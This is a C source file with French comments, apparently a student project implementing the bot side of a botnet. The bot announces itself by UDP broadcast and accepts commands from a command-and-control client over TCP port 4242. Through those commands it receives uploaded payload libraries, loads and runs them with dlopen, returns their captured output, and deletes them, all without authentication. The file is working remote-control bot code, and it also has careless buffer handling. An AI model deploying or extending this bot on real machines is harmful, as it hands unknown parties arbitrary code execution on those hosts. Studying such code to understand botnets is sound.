#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdbool.h>
#include <dlfcn.h>
#include <dirent.h>

#include "../Bibliotheques/libreseau.h"
#include "libthread.h"

#define TAILLE_MSG 50
#define RESULT_PATH "result/"
#define CHARGE_PATH "charge/"

/** STRUCTURES UTILES **/
/* Structre de paramètre pour les connexions TCP et UDP */
typedef struct {
	char *port;
	char *ip_destination;
}parametres;

typedef struct {
        int socket;
}param_TCP;


/** GLOBAL VARIABLES **/
char protocole_upload[5][TAILLE_MSG]= {"OKupload\n", "OKname_size\n", "OKname\n", "OKdata_size\n", "bye\n"};
char protocole_execut[6][TAILLE_MSG]= {"OKexecute\n", "OKname_size\n", "OKname\n", "", "bye\n", "NOKname\n"};
char protocole_delete[5][TAILLE_MSG]= {"OKdelet\n", "OKname_size\n", "OKname\n", "bye\n", "NOKname\n"};
char protocole_result[5][TAILLE_MSG]= {"OKresult\n", "OKid\n", "", "bye\n", "NOKid\n"};
int s_TCP;
int s_UDP;
void *handle;
void* verrou;
char* identifiant = "SAMHEO";
char message_generique[10];
int life_time = 0;
int id_res = 0;
int nb_charge = 0;

/** PROTOTYPES **/
int upload_protocole(int socket);
int execute_protocole(int socket);
int delete_protocole(int socket);
int result_protocole(int socket);
void count_chgANDres();





void invoke_method( char *lib, char *filename)
{
    void *dl_handle;
    void (*func)(void);
    char *error;

    /* Open the shared object */
    dl_handle = dlopen( lib, RTLD_LAZY );
    if (!dl_handle) {
        printf( "!!! %s\n", dlerror() );
        return;
    }
    /* Resolve the symbol (method) from the object */
    func = dlsym( dl_handle,"start");
    error = dlerror();
    if (error != NULL) {
        printf( "!!!%s\n", error );
        return;
    }

    char *path = calloc(TAILLE_MSG, 1);
    strcpy(path, RESULT_PATH);
    strcat(path, filename);
    int out = open(path, O_WRONLY|O_TRUNC|O_CREAT, 0666);
    int oldout = dup(1);
    dup2(out, 1);

    /* Call the resolved method and print the result */
    (*func)();
    dup2(oldout,1);
    dlclose( dl_handle );

    return;
}






/* Fonction de communication entre le C&C client et le boat serveur en TCP */
int gestionClientTCP(void* parametres) {
    printf("Gestion client lancé\n");
    param_TCP* p = parametres;
    int s = p->socket;
    int connect = 1;
    int done = 0;
    while(connect == 1) {
	/* Copie du message reçu dans 'data_receive' */
        char data_receive[MAX_LIGNE];
	char data_send[MAX_LIGNE];
	int cb = recv( s, data_receive, sizeof(data_receive), 0 );

	/* Réponse du bot adaptée en fonction du message reçu */
        if (strncmp(data_receive,"STAT", 4)==0) {
	    count_chgANDres();
	    memset(data_send, 0, MAX_LIGNE);
	    cb = sprintf( data_send, "%d,%d,%d", life_time, nb_charge, id_res);
            printf("life time vaut :::: %d\n", life_time);
            printf("data_ vaut %s\n", data_send );
	    cb = send( s, data_send, cb, 0 );
            memset(data_send,0,MAX_LIGNE);
        }
        else if (strncmp(data_receive,"QUIT", 4)==0) {
	    connect = 0;
            printf("connect = 0\n");
        }
        else if (strncmp(data_receive,"upload?\n",8)==0) {
            done = upload_protocole(s);
        }
        else if (strcmp(data_receive,"execute?\n")==0) {
            P(verrou);
            count_chgANDres();
            done = execute_protocole(s);
            V(verrou);
        }
        else if (strcmp(data_receive,"delet?\n")==0) {
            done = delete_protocole(s);
        }
        else if (strcmp(data_receive,"result?\n")==0) {
            done = result_protocole(s);
        }
    }
    close(s);
    printf("fin fonction\n");
    return done;
}



/*
Permet l'envoie de char *snd puis la reception de char *rcv dans la socket
Permet de vérifier si la chaine reçu correspond au protocole (char *verif)
Permet d'inverser envoie et reception grace à int sens
*/
int aller_retour(char *snd, char *rcv, int socket, char *verif, int sens)
{
    memset(rcv,0,TAILLE_MSG);
    if (sens == 1) {
        /* ALLER */
        send( socket, snd, TAILLE_MSG, 0 );
        /* RETOUR */
        recv( socket, rcv, TAILLE_MSG, 0 );
        if(strcmp(verif,"")!=0){
            if (strcmp(rcv, verif) == 0) return 0;
            return -1;
        }
        return 0;
    }
    else {
        /* RETOUR */
        recv( socket, rcv, TAILLE_MSG, 0 );
        if(strcmp(verif,"")!=0){
            if (strcmp(rcv, verif) == 0) {
                /* ALLER */
                send( socket, snd, TAILLE_MSG, 0 );
                return 0;
            }
            return -1;
        }
        send(socket,snd,TAILLE_MSG,0);
        return 0;
    }
}




/* Receptionne la charge transmise par le C&C */
int upload_protocole(int s) {

    printf("upload: \n");
    char data_receive[5][MAX_LIGNE];
    char* name;
    char* path;
    int taille_nom;
    FILE* charge = NULL;

    int i = 0;
    while (i < 5) {
        aller_retour(protocole_upload[i],data_receive[i],s,"",1);

	if (i == 2) {
	    taille_nom = atoi(data_receive[0]);
            name = calloc(taille_nom, 1);
            strncpy(name,data_receive[1],taille_nom);

            path = calloc(taille_nom + 10, 1);
    	    strcpy(path, CHARGE_PATH);
    	    strcat(path,name);

    	    charge = fopen(path,"wb+");
    	    send(s,protocole_upload[3],TAILLE_MSG,0);

	    /* Reception du fichier */
	    char octet[1];
    	    int nb_octet = atoi(data_receive[2]);
    	    for(int i =0; i<nb_octet; i++) {
		recv(s,octet,1,0);
        	fwrite(octet,1,1,charge);
    	    }
	    i = 3;
	}
	i ++;
    }
    fclose(charge);
    nb_charge ++;
    free(path);
    free(name);
    printf("fin upload\n");
    return 0;
}




/* Execute une charge si elle est présente */
int execute_protocole(int s) {

    printf("execute\n");
    char data_receive[5][MAX_LIGNE];
    char filename[MAX_LIGNE];
    int taille_nom;
    char* name;
    char* path;
    FILE* charge = NULL;
    int i = 0;
    while (i < 5) {
        aller_retour(protocole_execut[i],data_receive[i],s,"",1);
	if (i == 1) {
	    taille_nom=atoi(data_receive[0]);
    	    name = calloc(taille_nom, 1);
    	    strncpy(name,data_receive[1],taille_nom);
    	    path = calloc(taille_nom + 10, 1);
    	    strcpy(path, CHARGE_PATH);
	    if((charge = fopen(strcat(path,name),"r"))==NULL) {
	        /* Si charge absente */
        	send(s,protocole_execut[5],TAILLE_MSG,0);
        	return 0;
            }
	    else {
		printf("EXECUTE\n");
	        fclose(charge);
	 	sprintf( filename, "%d", id_res);
		invoke_method(path, filename);
	        sprintf( filename, "%d\n", id_res);
		send(s,protocole_execut[2], TAILLE_MSG,0);
		strcpy(protocole_execut[3], filename);
		i = 2;
		id_res ++;
	    }
	}
        i++;
    }

    free(path);
    free(name);
    return 0;
}





/* Supprime une charge si celle ci est présente dans ./charge */
int delete_protocole(int s) {

    printf("delete\n");
    char data_receive[5][MAX_LIGNE];
    int taille_nom;
    char* name;
    char* path;
    FILE* charge = NULL;

    int i = 0;
    while (i < 3) {
        aller_retour(protocole_delete[i],data_receive[i],s,"",1);

	if (i == 1) {
	    taille_nom=atoi(data_receive[0]);
    	    name = calloc(taille_nom, 1);
    	    path = calloc(sizeof(name)+10, 1);
	    strncpy(name,data_receive[1],taille_nom);
    	    strcpy(path, CHARGE_PATH);

	    if((charge = fopen(strcat(path,name),"r"))==NULL) {
	        printf("charge pas upload\n");
        	send(s,protocole_delete[4],TAILLE_MSG,0);
        	return 0;
            }
	    else {
	        printf("close charge\n");
        	fclose(charge);
        	remove(path);
	    }
	}
	i ++;
    }
    send(s,protocole_delete[3], TAILLE_MSG,0);
    free(path);
    free(name);
    return 0;
}





/* Transmet le résultat de l'execution d'une charge si celle ci existe dans ./result */
int result_protocole(int s) {

    printf("result\n");
    char data_receive[3][MAX_LIGNE];
    char name[TAILLE_MSG];
    char* path;
    int id_size;
    memset(name, 0, TAILLE_MSG);
    memset(data_receive[0], 0, TAILLE_MSG);
    FILE* id = NULL;

    int i = 0;
    while (i < 3) {
        aller_retour(protocole_result[i],data_receive[i],s,"",1);
	printf("rcv :%s\n", data_receive[i]);

	if (i == 0) {
	    path = calloc(sizeof(name)+10, 1);
	    strncpy(name,data_receive[0],strlen(data_receive[0])-1);
	    strcpy(path, RESULT_PATH);
    	    strcat(path,name);

	    if((id = fopen(path,"r")) !=NULL) {
		/* Si le résultat d'execution existe */
	        send(s,protocole_result[1],TAILLE_MSG,0);
        	fseek(id, 0, SEEK_END);
		/* obtention de la taille du fichier */
		id_size = ftell(id);
        	rewind(id);

		sprintf(protocole_result[2], "%d\n",id_size);
		send(s,protocole_result[2],TAILLE_MSG,0);
		recv(s,data_receive[2], TAILLE_MSG, 0);
		if(id !=NULL) {
		    /* Envoie du fichier */
	            char octet[1];
        	    for(int i = 0; i<id_size; i++) {
            	        fread(octet,1,1,id);
            	        send(s, octet, 1, 0 );
        	    }
        	    fclose(id);
		    i = 2;
		    aller_retour(protocole_result[i],data_receive[i],s,"",0);
		}
	    }
	    else {
		send(s,protocole_result[3],TAILLE_MSG,0);
        	return 0;
	    }

	}
	i ++;
    }
    free(path);
    printf("fin result\n");
    return 0;
}





/* Fonction qui permet d'écouter et de traiter par la méthode 'traitement' des */
int boucleServeurTCP(int ecoute, int (*traitement)(void*))
{
    int dialogue;
    while(1)
    {
	/* Attente d'une connexion */
        if((dialogue=accept(ecoute,NULL,NULL))<0) {printf("!:\n"); return -1;}

        param_TCP param_thread;
        param_thread.socket = dialogue;
        creer_process(traitement, &param_thread , sizeof(param_thread));
        printf("Lancement Thread\n");
    }
}






/* Fonction utilisée dans le thread TCP */
/* Lancement d'une socket TCP et mise en écoute des clients */
void TCP_f(void *p_param_TCP) {
    printf("Boat Thread TCP\n");

    /* Récupération des arguments : */
    parametres *param = p_param_TCP;
    char *port = param -> port;

    /* Initialisation socket TCP: */
    int s_TCP = initialisationServeurTCP(port,MAX_CONNEXIONS);
    printf("Initialisation serveur TCP réussie\n");

    /* boucle de communication */
    boucleServeurTCP(s_TCP, gestionClientTCP);
    printf("après boucle serveur tcp\n");
    close(s_TCP);
}
void (*p_TCP)(void *) = &TCP_f;





/* Fonction utilisée dans le thread UDP */
/* Envoie en broadcast des informations du boat */
void UDP_f(void *p_param_UDP)
{
    printf("Boat Thread UDP\n");
    void *handle;

    /* Récupération des arguments : */
    parametres *param = p_param_UDP;
    char *port = param -> port;
    char *ip_destination = param -> ip_destination;

    /* Initialisation du serveur UDP */
    s_UDP=creationsocketUDP(ip_destination, port, &handle);
    printf("Création Socket UDP réussie\n");

    /* Envoie en continu des informations du boat */
    while(1) {
        int taille_message_generique=strlen(message_generique);
        envoimessageUDP(s_UDP,handle,(unsigned char *)message_generique,taille_message_generique);
	/* sleep pour ne pas saturer les communications */
        sleep(5);
	printf("envoie %s\n", message_generique);
    }

  free(handle);
  close(s_UDP);
}
void (*p_UDP)(void *) = &UDP_f;



void count_chgANDres() {

    int i = 0;
    char path[TAILLE_MSG];
    FILE* id = NULL;

    sprintf(path, "result/%d", i);
    while ((id = fopen(path,"r")) != NULL) {
	fclose(id);
	i ++;
	sprintf(path, "result/%d", i);
    }
    id_res = i;

    struct dirent *lecture;
    DIR *rep;
    rep = opendir("charge/" );
    int j = 0;
    while ((lecture = readdir(rep))) {
	j ++;
    }
    closedir(rep);
    nb_charge = j-2;
    return;
}




int main(){

  /* Definition est remplissage de structures parametres */
  parametres param_UDP = {"4242", "255.255.255.255"};
  parametres param_TCP = {"4242", NULL};

  /* Attribution des pointeurs de structures paramètres */
  parametres *p_param_UDP = &param_UDP;
  parametres *p_param_TCP = &param_TCP;

  verrou = init_verrou();

  /*Création des process: */
  count_chgANDres();
  creer_process(p_UDP, p_param_UDP, sizeof(param_UDP));
  creer_process(p_TCP, p_param_TCP, sizeof(param_TCP));

  while(1) {
    sleep(1);
    life_time+=1;
    sprintf(message_generique, "SAMHEO%d", life_time);
  }

  return 0;
}


